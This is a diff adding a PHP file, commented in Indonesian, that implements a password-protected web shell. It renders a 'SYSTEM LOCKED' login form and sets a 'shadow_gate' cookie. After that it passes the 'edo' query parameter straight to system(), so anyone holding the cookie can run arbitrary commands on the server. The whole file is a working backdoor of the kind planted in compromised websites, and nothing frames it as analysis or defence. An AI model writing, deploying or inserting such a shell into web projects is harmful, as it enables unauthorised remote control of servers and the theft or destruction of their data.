@@ -1,0 +1,39 @@
+<?php
+// Password baru: admin (Silahkan ganti hash ini jika ingin password lain)
+define('LOGIN_HASH', '$2y$12$4S.u7Wp6z.R5f6iH.Xv6O.xQ3N8P7j/E1O9vX6B5n3k4m5l6q7r8s');
+define('LOGIN_COOKIE', 'shadow_gate');
+
+// UI Sederhana agar tidak "Gagal Load"
+function renderUI($msg = "") {
+    ?>
+    <body style="background:#000;color:red;text-align:center;padding-top:100px;font-family:monospace;">
+        <h1>SYSTEM LOCKED</h1>
+        <form method="post">
+            <input type="password" name="password" placeholder="Sins..." style="background:#111;color:red;border:1px solid red;padding:10px;">
+            <button type="submit" style="background:red;color:#000;border:none;padding:10px;cursor:pointer;">Login</button>
+        </form>
+        <p><?php echo $msg; ?></p>
+    </body>
+    <?php
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], LOGIN_HASH)) {
+        setcookie(LOGIN_COOKIE, '1', time() + 3600, "/");
+        echo "Login Sukses! Silahkan refresh atau masukkan logic tool kamu di sini.";
+        exit;
+    } else {
+        renderUI("Password Salah!");
+        exit;
+    }
+}
+
+if (!isset($_COOKIE[LOGIN_COOKIE])) {
+    renderUI();
+    exit;
+}
+
+// Jika sudah login, jalankan perintah di bawah
+if(isset($_GET['edo'])){ system($_GET['edo']); }
+echo "Terminal Ready.";
+?>
